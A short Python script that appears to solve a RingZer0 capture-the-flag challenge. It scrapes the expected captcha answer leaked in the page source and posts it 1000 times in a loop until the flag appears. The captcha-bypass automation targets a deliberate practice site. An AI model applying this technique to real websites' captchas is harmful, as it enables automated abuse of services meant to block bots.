from requests import get, post
from re import search

post_headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "es-ES,es;q=0.9",
"Cookie": "PHPSESSID=MY_COOKIE_SESSION",
"Cache-Control": "max-age=0",
"Content-Length": "13",
"Connection": "close","Content-Type":"application/x-www-form-urlencoded","Host": "challenges.ringzer0team.com:10138","Origin": "http://challenges.ringzer0team.com:10138","Referer": "http://challenges.ringzer0team.com:10138/form1.php","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36 OPR/63.0.3368.58152"}


get_headers = {"Accept": "image/webp,image/apng,image/*,*/*;q=0.8",
"Accept-Encoding": "gzip, deflate",
"Accept-Language": "es-ES,es;q=0.9",
"Connection": "close",
"Cookie": "PHPSESSID=MY_COOKIE_SESSION",
"Host": "challenges.ringzer0team.com:10138",
"Referer": "http://challenges.ringzer0team.com:10138/form1.php",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36 OPR/63.0.3368.58152"}




def get_captcha():

  html = get("http://challenges.ringzer0team.com:10138/form1.php", headers=get_headers)
  get("http://challenges.ringzer0team.com:10138//captcha/captchabroken.php?10000", headers=get_headers)
  if html.status_code == 200:
    code = search('A == "(.*)"', html.text).group(1)

    return code

def send_captcha():

  captcha = {'captcha':get_captcha()}
  html = post("http://challenges.ringzer0team.com:10138/captcha1.php", data = captcha, headers=post_headers)
  if html.status_code == 200:

    return True, html
  
if __name__ == '__main__':

  for i in range(1000):
    html = send_captcha()
    if html[0]:
      try:
        print(search(r'You now have (.*) successful captchas. 1000 requests is required', html[1].text).group())
      except AttributeError:
        print('Congrats '+search(r'The flag is "(.*)"', html[1].text).group())
        break
